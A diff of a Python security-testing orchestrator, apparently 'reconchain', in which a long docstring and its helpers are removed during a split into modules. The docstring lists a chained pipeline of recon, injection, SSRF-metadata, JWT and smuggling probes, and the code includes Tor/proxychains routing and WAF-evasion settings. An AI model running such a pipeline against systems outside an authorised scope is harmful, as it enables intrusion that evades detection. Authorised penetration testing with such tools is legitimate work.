@@ -1,1160 +1,84 @@
-#!/usr/bin/env python3
-"""
-reconchain.py — orchestrator for a chained recon pipeline.
-Pipeline
-========
-00-SCOPE   scope validation                            --> scope_validated.txt
-01-RECON   subfinder | amass                          --> all_subs.txt
-02-RESOLVE dnsx                                      --> resolved.txt
-03-PERMUTE dnsgen | dnsx                             --> permuted.txt
-04-SCAN    naabu/nmap | httpx | nuclei                --> ports.txt / hosts.txt / takeover.txt
-04b-TAKEOVER-VALIDATE  confirm dangling CNAME         --> takeover_confirmed.txt
-05-HARVEST gau | gospider | katana                   --> urls_gau.txt / urls_katana.txt
-            | subjs | waymore
-05b-APISPEC hunt /swagger.json, /openapi.yaml         --> api_specs.txt
-06-JSINTEL SecretFinder | nuclei                     --> js_secrets.txt
-07-PARAMS  Arjun                                     --> params.txt
-08-FUZZ    ffuf | feroxbuster                        --> fuzz.txt
-09-VULNSCAN nuclei (full + tech)                     --> nuclei.txt
-10-TLSCMS  testssl.sh | wpscan                       --> tls_wp.txt
-11-INJECT  kxss | dalfox | SSRF probes               --> vulns.txt
-11b-SQLMAP sqlmap (pre-filtered via response diff)   --> sqlmap_findings.txt
-12-SSTI    SSTI probes                                --> ssti.txt
-13-OOB     interactsh-client                          --> oast/callbacks.txt
-14-ORIGIN  favicon hash | crt.sh | dig | ipinfo.io   --> origin.txt
-15-SECRETS gitleaks | JS regex/entropy               --> secrets.txt
-16a-AUTHZ   auth bypass headers | role bypass         --> authz_bypass.txt
-16b-MASSASSIGN  mass assignment probes               --> mass_assign.txt
-17-IDOR    ID manipulation / predictable IDs          --> idor.txt
-17b-SSRFMETA  cloud metadata after SSRF confirmed     --> ssrf_meta.txt
-18-CLOUD   cloud_enum | custom probes                 --> cloud_buckets.txt
-19-GIT     gitdumper | trufflehog                     --> git_exposure.txt
-20-GRAPHQL inql | custom probes                       --> graphql_introspection.txt
-21-WAF     wafw00f | custom signatures                --> waf_detection.txt
-22-NOSQLI  NoSQL injection probes                     --> nosqli.txt
-23-RACE    race condition probes (state-changing)     --> race_conditions.txt
-24-JWT     JWT analysis                               --> jwt_analysis.txt
-25-XXE     XXE injection probes                       --> xxe.txt
-26-CMDINJECT command injection probes                 --> cmd_injection.txt
-27-SSPP    server-side prototype pollution             --> sspp.txt
-28-CACHED  cache poisoning probes                     --> cache_poison.txt
-29-DEPCHECK dependency check probes                   --> depcheck.txt
-30-LFI     path traversal / local file inclusion       --> lfi.txt
-31-OPENREDIR open redirect probes                     --> open_redirect.txt
-32-CLICKJACK clickjacking probes                      --> clickjacking.txt
-33-CRLF    CRLF injection probes                      --> crlf_injection.txt
-34-RATELIMIT rate-limit burst test                    --> rate_limiting.txt
-35-CORSADV advanced CORS misconfig probes             --> cors_advanced.txt
-36-JWTADV  advanced JWT attacks                       --> jwt_advanced.txt
-37-FILEUPLOAD file upload vulnerability probes        --> file_upload.txt
-38-SMUGGLE CL.TE / TE.CL request smuggling            --> smuggling.txt
-39-OAUTH   OAuth misconfiguration probes              --> oauth_misconfig.txt
-40-PWRESET password reset token analysis              --> password_reset.txt
-41-WEBSOCKET WebSocket upgrade detection              --> websocket.txt
-42-LDAP    LDAP injection probes                      --> ldap_injection.txt
-43-DESERIAL deserialization payload tests             --> deserialization.txt
-44-CHAIN   cross-reference findings                   --> chain_correlation.txt
-45-EVIDENCE capture request/response for findings      --> evidence/
-44-REPORT  HTML/MD/JSON/text                          --> summary.json / report.html / report.md
-Usage
------
-  reconchain.py -d example.com -o ./out
-  reconchain.py -d example.com --only 01-RECON,02-RESOLVE,04-SCAN
-  reconchain.py -d example.com --skip 10-TLSCMS,11-INJECT
-  reconchain.py -d example.com --resume           # reuse ./out/state.json
-  reconchain.py -d example.com --fast             # fast: 01-RECON→02-RESOLVE→04-SCAN→05-HARVEST→report
-  reconchain.py -d example.com --no-color -q
-Stdlib only. Any missing tool is reported and its phase is skipped (non-fatal
-unless the step is marked required).
-"""
-
+"""Phase implementations for ReconChain pipeline."""
 from __future__ import annotations
-import argparse
+
 import asyncio
 import base64
 import contextlib
-import hashlib
-import inspect
 import fnmatch
+import hashlib
 import json
+import math
 import os
+import random
 import re
 import shlex
 import shutil
-import signal
+import socket
 import struct
 import subprocess
-import sys
-import threading
 import time
-import math
-import urllib.error
 import urllib.parse
 import urllib.request
-from dataclasses import dataclass, field
+import urllib.error
 from datetime import datetime
 from pathlib import Path
-from typing import Any, Callable, Dict, Iterator, List, Optional, Set, Tuple
+from typing import Any, Dict, List, Optional, Set, Tuple
 
-_re = re  # module-level alias consumed by tests
-# tqdm is an OPTIONAL dependency. The orchestrator must stay runnable with the
-# stdlib alone (see module docstring + empty pyproject `dependencies`), so when
-# tqdm is absent we fall back to a tiny no-op shim that preserves the small
-# surface we use (`tqdm(...)` bars with update/set_description/close and the
-# `tqdm.write` classmethod). Install tqdm for live progress bars.
-try:
-    from tqdm import tqdm
-except ImportError:
-
-    class tqdm:  # type: ignore[no-redef]
-        _global_pos = 0
-
-        def __init__(
-            self, *args: Any, total: Optional[int] = None, desc: Optional[str] = None, **kwargs: Any
-        ) -> None:
-            self.total = total
-            self.desc = desc
-            self._n = 0
-            self._closed = False
-
-        def update(self, n: int = 1) -> None:
-            self._n += n
-            if self.desc:
-                print(f"  [{self._n}/{self.total}] {self.desc}", flush=True)
-
-        def set_description(self, desc: Optional[str] = None, refresh: bool = True) -> None:
-            if desc != self.desc:
-                self.desc = desc
-                if not self._closed:
-                    print(f"  [{self._n}/{self.total}] {desc}", flush=True)
-
-        def close(self) -> None:
-            self._closed = True
-
-        @classmethod
-        def write(cls, msg: str = "", *args: Any, **kwargs: Any) -> None:
-            print(msg, flush=True)
-
-
-# ─────────────────────── hostname validation (chain glue) ────────────────────
-# Used by the 01-RECON merge and the 02-RESOLVE parse to filter obvious garbage out of the
-# chain. Accepts DNS hostnames: 1-253 chars, dot-separated labels of
-# [a-z0-9-], with no leading or trailing hyphen in labels.
-_HOSTNAME_RE = re.compile(
-    r"^(?=.{1,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+"
-    r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.?$"
+from reconchain.config import PipelineConfig, VALID_PHASES, _SAFE_HOST, _HOSTNAME_RE
+from reconchain.process import (
+    _maybe_timeout, _USE_PROXYCHAINS, run_parallel,
+    _PIPELINE_CFG, _run, _proxify_cmd,
 )
-__version__ = "1.5.1"
-VALID_PHASES = {
-    "00-SCOPE",
-    "01-RECON",
-    "02-RESOLVE",
-    "03-PERMUTE",
-    "04-SCAN",
-    "04b-TAKEOVER-VALIDATE",
-    "05-HARVEST",
-    "05b-APISPEC",
-    "06-JSINTEL",
-    "07-PARAMS",
-    "08-FUZZ",
-    "09-VULNSCAN",
-    "10-TLSCMS",
-    "11-INJECT",
-    "11b-SQLMAP",
-    "12-SSTI",
-    "13-OOB",
-    "14-ORIGIN",
-    "15-SECRETS",
-    "16A-AUTHZ",
-    "16B-MASSASSIGN",
-    "17-IDOR",
-    "17B-SSRFMETA",
-    "18-CLOUD",
-    "19-GIT",
-    "20-GRAPHQL",
-    "21-WAF",
-    "22-NOSQLI",
-    "23-RACE",
-    "24-JWT",
-    "25-XXE",
-    "26-CMDINJECT",
-    "27-SSPP",
-    "28-CACHED",
-    "29-DEPCHECK",
-    "30-LFI",
-    "31-OPENREDIR",
-    "32-CLICKJACK",
-    "33-CRLF",
-    "34-RATELIMIT",
-    "35-CORSADV",
-    "36-JWTADV",
-    "37-FILEUPLOAD",
-    "38-SMUGGLE",
-    "39-OAUTH",
-    "40-PWRESET",
-    "41-WEBSOCKET",
-    "42-LDAP",
-    "43-DESERIAL",
-    "44-CHAIN",
-    "44-REPORT",
-    "45-EVIDENCE",
-}
-FAST_PHASES = {"00-SCOPE", "01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST", "44-REPORT"}
-PhaseSet = Set[str]
-
-
-def _is_valid_hostname(s: str) -> bool:
-    """True if `s` looks like an FQDN-shaped hostname (has at least one dot)."""
-    if not s:
-        return False
-    s = s.rstrip(".").lower()
-    if "." not in s or any(c.isspace() or c in "[]()<>{}" for c in s):
-        return False
-    return bool(_HOSTNAME_RE.match(s))
-
-
-def _is_under_domain(host: str, domain: str) -> bool:
-    """True if `host` is `domain` itself or a subdomain of `domain`."""
-    h = host.rstrip(".").lower()
-    d = domain.rstrip(".").lower()
-    return h == d or h.endswith("." + d)
-
-
-def _target_token(line: str) -> str:
-    """Return the first URL/host token from a tool output line."""
-    token = line.strip().split()[0] if line.strip() else ""
-    # Strip trailing dot from FQDN and reject non-URL/non-host tokens
-    token = token.rstrip(".")
-    if not _is_valid_hostname(token) and not token.startswith("http"):
-        return ""
-    return token
-
-
-def _parse_httpx_tech(src: Path, dst: Path) -> int:
-    """Parse httpx -tech-detect output into a tech-annotated file.
-    httpx format:  URL [status] [title] [tech1,tech2] [final_url]
-    Writes lines like: URL  [status]  [title]  [tech1,tech2]
-    """
-    seen: Set[str] = set()
-    for line in read_lines(src):
-        line = line.strip()
-        if not line:
-            continue
-        url = line.split()[0]
-        brackets = re.findall(r"\[.*?\]", line)
-        if len(brackets) >= 3:
-            status = brackets[0]
-            title = brackets[1]
-            tech = brackets[2]
-            entry = f"{url} {status} {title} {tech}".rstrip()
-            if entry not in seen:
-                seen.add(entry)
-    if seen:
-        ensure(dst).write_text("\n".join(sorted(seen)) + "\n")
-    return len(seen)
-
-
-def _target_lines(path: Path) -> List[str]:
-    return [_target_token(line) for line in read_lines(path) if _target_token(line)]
-
-
-def _write_target_tokens(src: Path, dst: Path) -> int:
-    seen: Set[str] = set()
-    for token in _target_lines(src):
-        if token not in seen:
-            seen.add(token)
-    ensure(dst).write_text("\n".join(sorted(seen)) + "\n")
-    return len(seen)
-
-
-# ───────────────────────────── pretty logging ──────────────────────────────
-def _color() -> bool:
-    return sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
-
-
-C = {
-    "r": "\033[0m" if _color() else "",
-    "d": "\033[2m" if _color() else "",
-    "g": "\033[32m" if _color() else "",
-    "y": "\033[33m" if _color() else "",
-    "b": "\033[34m" if _color() else "",
-    "c": "\033[36m" if _color() else "",
-    "m": "\033[35m" if _color() else "",
-    "red": "\033[31m" if _color() else "",
-}
-LVL = {"info": C["c"], "ok": C["g"], "warn": C["y"], "err": C["red"], "skip": C["d"]}
-
-
-def disable_color() -> None:
-    global LVL, C
-    C = {k: "" for k in C}
-    LVL = {k: "" for k in LVL}
-
-
-def log(lvl: str, msg: str) -> None:
-    tqdm.write(f"{LVL[lvl]}[{lvl[0].upper()}]{C['r']} {msg}")
-
-
-# ────────────────────────────── tool registry ──────────────────────────────
-class Tools:
-    """Cached presence check for external binaries."""
-
-    def __init__(self) -> None:
-        self._cache: Dict[str, bool] = {}
-        self.missing_set: Set[str] = set()
-        self.missing: List[str] = []  # insertion-ordered, deduped
-        self._broken: Dict[str, bool] = {}  # tools that exist but crash
-
-    def have(self, *names: str) -> List[str]:
-        out: List[str] = []
-        for n in names:
-            if n not in self._cache:
-                ok = shutil.which(n) is not None
-                self._cache[n] = ok
-                if not ok and n not in self.missing_set:
-                    self.missing_set.add(n)
-                    self.missing.append(n)
-            if self._cache[n] and not self._broken.get(n):
-                out.append(n)
-        return out
-
-    def has(self, name: str) -> bool:
-        return bool(self.have(name))
-
-    def seed_missing(self, names: List[str]) -> None:
-        """Pre-populate the missing-tools list (used for --resume)."""
-        for n in names:
-            if n not in self.missing_set:
-                self.missing_set.add(n)
-                self.missing.append(n)
-
-    def verify(self, name: str, args: Optional[List[str]] = None) -> bool:
-        """Verify that a tool binary actually runs (not just exists).
-        Runs `tool --help` (or custom args) and checks exit code 0.
-        Caches broken status so repeated calls are cheap."""
-        if name in self._broken:
-            return not self._broken[name]
-        if not shutil.which(name):
-            self._broken[name] = True
-            return False
-        try:
-            result = subprocess.run(
-                [name] + (args or ["--help"]),
-                stdin=subprocess.DEVNULL,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=10,
-            )
-            ok = result.returncode == 0
-            self._broken[name] = not ok
-            if not ok:
-                log("warn", f"tool {name} binary exists but failed verification (rc={result.returncode})")
-            return ok
-        except Exception as e:
-            self._broken[name] = True
-            log("warn", f"tool {name} verification failed: {e}")
-            return False
-
-
-# ─────────────────────────── subprocess helpers ────────────────────────────
-@dataclass
-class PipelineConfig:
-    """Shared configuration carried through the pipeline."""
-    sqlmap_level: int = 1
-    sqlmap_risk: int = 1
-    delay: float = 0.0
-    rate_limit: int = 0
-    sample_urls_fuzz: int = 200
-    sample_urls_params: int = 50
-
-    sample_urls_arjun_waf: int = 5
-    sample_hosts_ssl: int = 3
-    sample_hosts_origin: int = 10
-    sample_endpoints_l: int = 20
-    sample_urls_xss_blind: int = 20
-    sample_urls_ssti: int = 5
-    sample_endpoints_post: int = 5
-    sample_endpoints_cors: int = 10
-    nuclei_exclude_tags: str = ""
-    proxy: str = ""
-    sample_hosts_cloud: int = 5
-    sample_hosts_git: int = 5
-    sample_hosts_graphql: int = 5
-    sample_hosts_waf: int = 5
-    sample_urls_nosqli: int = 30
-    sample_endpoints_race: int = 10
-    sample_hosts_jwt: int = 20
-    sample_urls_xxe: int = 10
-    sample_urls_cmdi: int = 30
-    sample_endpoints_sspp: int = 10
-    sample_hosts_cached: int = 10
-    sample_urls_depcheck: int = 30
-    sample_urls_redirect: int = 30
-    sample_hosts_clickjack: int = 20
-    sample_urls_crlf: int = 20
-    sample_hosts_ratelimit: int = 10
-    sample_endpoints_ratelimit: int = 5
-    sample_endpoints_corsadv: int = 10
-    sample_hosts_jwtadv: int = 20
-    sample_urls_upload: int = 10
-    sample_hosts_smuggle: int = 10
-    sample_endpoints_oauth: int = 10
-    sample_endpoints_pwreset: int = 10
-    sample_hosts_websocket: int = 10
-    sample_urls_ldap: int = 20
-    sample_endpoints_deserial: int = 10
-    sample_urls_lfi: int = 30
-    sample_urls_idor: int = 50
-    sample_urls_apisec: int = 50
-    takeover_validate: bool = True
-    waf_detected: bool = False
-    waf_evasion_throttle: float = 0.0
-    credentials_queue: List[str] = field(default_factory=list)
-
-
-def _auto_detect_proxy() -> str:
-    for var in ("ALL_PROXY", "HTTPS_PROXY", "HTTP_PROXY", "PROXY",
-                "all_proxy", "https_proxy", "http_proxy", "proxy"):
-        val = os.environ.get(var, "")
-        if val:
-            return val
-    return ""
-
-
-def _set_proxy_env(proxy: str) -> None:
-    """Set all standard proxy env vars so any subprocess inherits them.
-    Go tools (httpx, ffuf, nuclei, katana, etc.) respect ALL_PROXY/HTTPS_PROXY.
-    Python tools (via urllib) respect HTTP_PROXY/HTTPS_PROXY.
-    When proxy is empty, ALL proxy env vars are unset to prevent stale
-    unreachable proxies from leaking to child processes."""
-    _PROXY_VARS = ["ALL_PROXY", "all_proxy", "HTTPS_PROXY", "https_proxy",
-                   "HTTP_PROXY", "http_proxy", "PROXY"]
-    if not proxy:
-        for v in _PROXY_VARS:
-            os.environ.pop(v, None)
-        return
-    os.environ["ALL_PROXY"] = proxy
-    os.environ["all_proxy"] = proxy
-    os.environ["HTTPS_PROXY"] = proxy
-    os.environ["https_proxy"] = proxy
-    os.environ["HTTP_PROXY"] = proxy
-    os.environ["http_proxy"] = proxy
-    os.environ["PROXY"] = proxy
-
-
-def _auto_detect_cookies() -> str:
-    val = os.environ.get("COOKIE", "")
-    if val:
-        return val
-    cookie_file = Path("cookies.txt")
-    if cookie_file.exists():
-        return cookie_file.read_text(encoding="utf-8", errors="ignore").strip()
-    return ""
-
-
-def _extra_headers_dict() -> Dict[str, str]:
-    """Build {Cookie: ..., Header: val} dict from env vars."""
-    headers: Dict[str, str] = {}
-    cookie = os.environ.get("COOKIE", "")
-    if cookie:
-        headers["Cookie"] = cookie
-    headers_raw = os.environ.get("EXTRA_HEADERS", "")
-    if headers_raw:
-        for hdr in headers_raw.split("\n"):
-            hdr = hdr.strip()
-            if hdr and ":" in hdr:
-                k, v = hdr.split(":", 1)
-                headers[k.strip()] = v.strip()
-    return headers
-
-
-def _extra_http_args() -> List[str]:
-    """Build [-H, "Cookie: ...", -H, "Header: val", ...] from env vars."""
-    args: List[str] = []
-    cookie = os.environ.get("COOKIE", "")
-    if cookie:
-        # Strip \r\n to prevent header injection in cookie value
-        args += ["-H", f"Cookie: {cookie.replace(chr(13), '').replace(chr(10), ' ')}"]
-    headers_raw = os.environ.get("EXTRA_HEADERS", "")
-    if headers_raw:
-        for h in headers_raw.replace(chr(13), "").split("\n"):
-            h = h.strip()
-            if h:
-                args += ["-H", h]
-    return args
-
-
-def _get_urlopener() -> Callable[..., Any]:
-    """Return a urlopen-compatible callable that respects proxy configuration.
-    Returns either urllib.request.urlopen (no proxy) or a proxy-wrapped version.
-    Note: urllib.request.ProxyHandler only supports HTTP/HTTPS proxies, not SOCKS."""
-    proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
-    if proxy and proxy.startswith(("http://", "https://")):
-        handler = urllib.request.ProxyHandler({
-            "http": proxy,
-            "https": proxy,
-        })
-        opener = urllib.request.build_opener(handler)
-        return opener.open
-    return urllib.request.urlopen
-
-
-class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
-    """HTTPRedirectHandler that does NOT follow redirects (returns 3xx directly)."""
-    def redirect_request(self, req, fp, code, msg, headers, newurl):
-        return None
-
-
-def _get_no_redirect_urlopener() -> Callable[..., Any]:
-    """Return a urlopen-compatible callable that does NOT follow HTTP redirects.
-    Note: urllib.request.ProxyHandler only supports HTTP/HTTPS proxies, not SOCKS."""
-    proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
-    if proxy and proxy.startswith(("http://", "https://")):
-        handler = urllib.request.ProxyHandler({
-            "http": proxy,
-            "https": proxy,
-        })
-        opener = urllib.request.build_opener(_NoRedirectHandler, handler)
-        return opener.open
-    opener = urllib.request.build_opener(_NoRedirectHandler)
-    return opener.open
-
-
-async def _async_urlopen(urlopen_func: Any, req: urllib.request.Request, timeout: int = 10) -> Tuple[int, Any, bytes]:
-    """Run urlopen in a thread pool to avoid blocking the event loop.
-    Returns (status_code, headers, body_bytes).
-    Headers is an http.client.HTTPMessage with case-insensitive .get() lookups."""
-    def _fetch() -> Tuple[int, Any, bytes]:
-        with urlopen_func(req, timeout=timeout) as resp:
-            return (resp.status, resp.headers, resp.read())
-    return await asyncio.wait_for(asyncio.to_thread(_fetch), timeout=timeout + 5)
-
-
-async def _async_urlopen_no_redirect(urlopen_func: Any, req: urllib.request.Request, timeout: int = 10) -> Tuple[int, Any, bytes]:
-    """Like _async_urlopen but does NOT follow HTTP 3xx redirects.
-    Returns (status_code, headers, body_bytes) from the initial response."""
-    _no_redirect_urlopen = _get_no_redirect_urlopener()
-    return await _async_urlopen(_no_redirect_urlopen, req, timeout=timeout)
-
-
-async def _throttle() -> None:
-    """Apply --delay between requests if configured."""
-    delay = _PIPELINE_CFG.delay
-    if delay > 0:
-        await asyncio.sleep(delay)
-
-
-async def _throttle_rate() -> None:
-    """Apply --delay or --rate-limit between requests."""
-    delay = _PIPELINE_CFG.delay
-    rate = _PIPELINE_CFG.rate_limit
-    if rate > 0:
-        await asyncio.sleep(1.0 / rate)
-    elif delay > 0:
-        await asyncio.sleep(delay)
-
-
-def _throttle_sync() -> None:
-    """Synchronous throttle for non-async probe loops."""
-    delay = _PIPELINE_CFG.delay
-    if delay > 0:
-        time.sleep(delay)
-
-
-@dataclass
-class StepResult:
-    name: str
-    cmd: List[str]
-    rc: int
-    duration: float
-    log_path: Optional[Path] = None
-    note: str = ""
-
-
-def _needs_proxychains(cmd: List[str]) -> bool:
-    """Return True if the command needs proxychains4 LD_PRELOAD wrapping.
-    Most tools (Go, Python, Ruby) get proxy support via env vars (ALL_PROXY,
-    HTTP_PROXY). Only Python probe scripts that use raw sockets need the
-    LD_PRELOAD approach."""
-    if not _USE_PROXYCHAINS:
-        return False
-    if len(cmd) < 2:
-        return False
-    # Generated Python probe scripts (tls_check, ssrf_probe, blind_xss_probe).
-    # These use raw sockets / urllib that doesn't support SOCKS natively.
-    if cmd[0] == "python3" and isinstance(cmd[1], str) and cmd[1].endswith(".py"):
-        try:
-            if "out" in Path(cmd[1]).parts:
-                return True
-        except (ValueError, OSError):
-            pass
-    return False
-
-
-_PROXY_VARS = ["ALL_PROXY", "all_proxy", "HTTPS_PROXY", "https_proxy",
-               "HTTP_PROXY", "http_proxy", "PROXY"]
-
-_BYPASS_TOOLS = {"massdns", "dnsx", "puredns", "dig", "nslookup", "host",
-                 "subfinder", "nmap", "naabu"}
-
-def _bypass_proxy(cmd: List[str]) -> bool:
-    """Return True if the command should bypass the proxy entirely.
-    DNS tools and port scanners don't need proxychains — DNS-over-SOCKS is
-    slow and port scanners use raw sockets."""
-    if not cmd:
-        return False
-    return cmd[0] in _BYPASS_TOOLS
-
-
-def _run_blocking(
-    cmd: List[str], timeout: int, cwd: Optional[Path], log_path: Path
-) -> Tuple[int, float]:
-    if _needs_proxychains(cmd):
-        cmd = ["proxychains4"] + cmd
-    t0 = time.monotonic()
-    log_path.parent.mkdir(parents=True, exist_ok=True)
-
-    # Save and clear proxy env for DNS/port-scan tools
-    _saved: Dict[str, Optional[str]] = {}
-    if _bypass_proxy(cmd):
-        for v in _PROXY_VARS:
-            _saved[v] = os.environ.pop(v, None)
-
-    try:
-        with log_path.open("wb") as logf:
-            proc: Optional[subprocess.Popen[bytes]] = None
-            try:
-                proc = subprocess.Popen(
-                    cmd,
-                    cwd=str(cwd) if cwd else None,
-                    stdin=subprocess.DEVNULL,
-                    stdout=logf,
-                    stderr=subprocess.STDOUT,
-                    start_new_session=True,
-                )
-                _register_proc(proc)
-                if not _wait_proc(proc, timeout):
-                    _kill_proc(proc)
-                    with _SPAWNED_PIDS_LOCK, contextlib.suppress(ValueError):
-                        _SPAWNED_PIDS.remove(proc.pid)
-                    with log_path.open("ab") as f:
-                        f.write(f"\n[timeout after {timeout}s]\n".encode("utf-8"))
-                    return 124, time.monotonic() - t0
-                with _SPAWNED_PIDS_LOCK, contextlib.suppress(ValueError):
-                    _SPAWNED_PIDS.remove(proc.pid)
-                return proc.returncode, time.monotonic() - t0
-            except FileNotFoundError as e:
-                with log_path.open("ab") as f:
-                    f.write(f"\n[binary not found: {e}]\n".encode("utf-8"))
-                return 127, time.monotonic() - t0
-            except (PermissionError, OSError) as e:
-                with log_path.open("ab") as f:
-                    f.write(f"\n[exec error: {e}]\n".encode("utf-8"))
-                return 127, time.monotonic() - t0
-    finally:
-        if _saved:
-            for v, val in _saved.items():
-                if val is not None:
-                    os.environ[v] = val
-
-
-# Global registry for tool exit codes across all phases.
-# Populated by _run() so state.json tool_failures catches non-zero exits
-# even when a phase function discards the StepResult list from run_parallel().
-_TOOL_RC_REGISTRY: Dict[str, int] = {}
-
-
-async def _run(name: str, cmd: List[str], timeout: int, outdir: Path, note: str = "") -> StepResult:
-    if not cmd:
-        log("skip", f"{name} (missing tool)")
-        return StepResult(name, [], 0, 0.0, outdir / "logs" / f"{name}.log", note=note or "skipped")
-    logp = outdir / "logs" / f"{name}.log"
-    log("info", f"{name}  $ {cmd[0]} {(' '.join(cmd[1:3]))}{' …' if len(cmd) > 3 else ''}")
-    rc, dur = await asyncio.to_thread(_run_blocking, cmd, timeout, outdir, logp)
-    lvl = "ok" if rc == 0 else "warn" if rc in (1, 124, 127) else "err"
-    log(lvl, f"{name} → rc={rc} in {dur:.1f}s")
-    if rc not in (0, None) and note != "skipped":
-        _TOOL_RC_REGISTRY[name] = rc
-    return StepResult(name, cmd, rc, dur, logp, note=note)
-
-
-# Concurrency cap so a phase with many jobs (e.g. phase 08-FUZZ: 5 URLs × 3 fuzzers)
-# does not fork-bomb the host. Defaults to 2× CPU count (auto-scaled);
-# pass -j/--jobs to override.
-MAX_PARALLEL_JOBS = max(4, (os.cpu_count() or 4) * 2)
-# Process-wide flag to wrap commands with proxychains4 when tor is enabled.
-_USE_PROXYCHAINS = False
-# Track all spawned subprocess PIDs so we can clean them up on shutdown.
-_SPAWNED_PIDS: List[int] = []
-_SPAWNED_PIDS_LOCK = threading.Lock()
-
-
-def _maybe_timeout(base: int) -> int:
-    """Scale up timeouts when running over proxychains/Tor (slow network)."""
-    return base * 3 if _USE_PROXYCHAINS else base
-
-
-def _wait_proc(proc: subprocess.Popen, timeout: int) -> bool:
-    """Wait for a subprocess with moderate polling intervals to avoid
-    hanging on unkillable processes (prevents zombies, H2/H10)."""
-    for _ in range(max(1, timeout)):
-        try:
-            proc.wait(timeout=1)
-            return True
-        except subprocess.TimeoutExpired:
-            continue
-    return False
-
-
-def _kill_proc(proc: subprocess.Popen) -> None:
-    """Kill a subprocess with SIGTERM, poll, then escalate to SIGKILL."""
-    if proc.poll() is not None:
-        return
-    with contextlib.suppress(ProcessLookupError):
-        os.killpg(proc.pid, signal.SIGTERM)
-    for _ in range(50):
-        try:
-            proc.wait(timeout=0.1)
-        except subprocess.TimeoutExpired:
-            continue
-        break
-    else:
-        with contextlib.suppress(ProcessLookupError):
-            os.killpg(proc.pid, signal.SIGKILL)
-        for _ in range(50):
-            try:
-                proc.wait(timeout=0.1)
-            except subprocess.TimeoutExpired:
-                continue
-            break
-
-
-def _cleanup_child_procs() -> None:
-    """Kill all tracked child process groups on shutdown."""
-    # Non-blocking acquire so signal handlers (C5) don't deadlock when the
-    # lock is held by a running _run_blocking call.
-    if not _SPAWNED_PIDS_LOCK.acquire(blocking=False):
-        return
-    try:
-        for pid in list(_SPAWNED_PIDS):
-            with contextlib.suppress(ProcessLookupError, OSError):
-                os.killpg(pid, signal.SIGTERM)
-            # Reap zombie so the OS doesn't accumulate defunct children (H1).
-            with contextlib.suppress(ProcessLookupError, OSError):
-                os.waitpid(pid, os.WNOHANG)
-        _SPAWNED_PIDS.clear()
-    finally:
-        _SPAWNED_PIDS_LOCK.release()
-
-
-def _register_proc(proc: subprocess.Popen) -> None:
-    with _SPAWNED_PIDS_LOCK:
-        _SPAWNED_PIDS.append(proc.pid)
-
-# Process-wide job semaphore. When several independent phases run concurrently
-# (see STAGES), they all draw from this single semaphore so the total number of
-# live external processes stays bounded by MAX_PARALLEL_JOBS regardless of how
-# many phases are in flight. Created on the running loop in run_pipeline; falls
-# back to a fresh per-call semaphore when unset (e.g. a phase called directly
-# from a test).
-_JOB_SEM: Optional[asyncio.Semaphore] = None
-_PIPELINE_CFG: PipelineConfig = PipelineConfig()
-
-
-class Progress:
-    def __init__(self, phases: List[str], stages: Optional[List[List[str]]] = None):
-        self.phases = phases
-        self.phase_set = set(phases)
-        self.stages = stages or []
-        self._weight_done = 0
-        self._completed = 0
-        self._total_weight = sum(_PHASE_WEIGHTS.get(p, 1) for p in phases)
-        self.bar = tqdm(total=self._total_weight, desc="Scan", position=0)
-
-    def next(self, name: str):
-        w = _PHASE_WEIGHTS.get(name, 1)
-        self._weight_done += w
-        self._completed += 1
-        if self.bar.total == 0:
-            return
-        stage_idx = 0
-        if self.stages:
-            seen = 0
-            for i, stage in enumerate(self.stages):
-                seen += sum(1 for p in stage if p in self.phase_set)
-                if self._completed <= seen:
-                    stage_idx = i
-                    break
-        pct = min(100.0, (self._weight_done / self.bar.total) * 100)
-        stage_info = f"Stage {stage_idx + 1}/{len(self.stages)} " if self.stages else ""
-        self.bar.set_description(f"{stage_info}[{pct:.0f}%] {name}")
-        self.bar.update(w)
-
-    def close(self):
-        self.bar.close()
-
-
-async def run_parallel(
-    jobs: List[Tuple[str, List[str], int]], outdir: Path, desc: str = "jobs"
-) -> List[StepResult]:
-    sem = _JOB_SEM if _JOB_SEM is not None else asyncio.Semaphore(MAX_PARALLEL_JOBS)
-    pbar = tqdm(total=len(jobs), desc=desc, leave=False, position=1)
-
-    async def _guarded(n: str, c: List[str], t: int) -> StepResult:
-        async with sem:
-            res = await _run(n, c, t, outdir)
-            pbar.update(1)
-            return res
-
-    coros = [_guarded(n, c, t) for n, c, t in jobs]
-    try:
-        return await asyncio.gather(*coros)
-    finally:
-        pbar.close()
-
-
-# ───────────────────────────── file utilities ───────────────────────────────
-def ensure(p: Path) -> Path:
-    p.parent.mkdir(parents=True, exist_ok=True)
-    if p.is_dir():
-        raise IsADirectoryError(f"{p} is a directory, expected a file")
-    return p
-
-
-def _existing_artifacts(d: Dict[str, str]) -> Dict[str, str]:
-    """Filter a phase-result dict to only keys whose file paths exist on disk.
-    Prevents non-existent artifact paths from polluting state.json."""
-    return {k: v for k, v in d.items() if Path(v).exists()}
-
-
-def read_lines(p: Path) -> List[str]:
-    """Return non-blank, non-`#`-prefixed lines. Used for *counting* and as
-    a permissive existence check. For driving tool input, prefer passing
-    the file path directly (tools handle their own comments).
-    Note: loads entire file into memory — for large files use iter_lines()."""
-    if not p.is_file():
-        return []
-    return [
-        ln.strip()
-        for ln in p.read_text(encoding="utf-8", errors="ignore").splitlines()
-        if ln.strip() and not ln.lstrip().startswith("#")
-    ]
-
-
-def iter_lines(p: Path) -> Iterator[str]:
-    """Memory-efficient streaming variant of read_lines.
-    Yields non-blank, non-`#`-prefixed lines one at a time."""
-    if not p.is_file():
-        return
-    with p.open(errors="ignore") as f:
-        for ln in f:
-            ln = ln.strip()
-            if ln and not ln.lstrip().startswith("#"):
-                yield ln
-
-
-def count_nonblank(p: Path) -> int:
-    """Count of non-blank lines (does NOT drop `#`-prefixed lines)."""
-    if not p.is_file():
-        return 0
-    return sum(1 for ln in p.read_text(encoding="utf-8", errors="ignore").splitlines() if ln.strip())
-
-
-def merge_unique(
-    srcs: List[Path], dst: Path, validator: Optional[Callable[[str], bool]] = None
-) -> int:
-    seen: Dict[str, None] = {}
-    # Read existing destination content first so we never lose previously
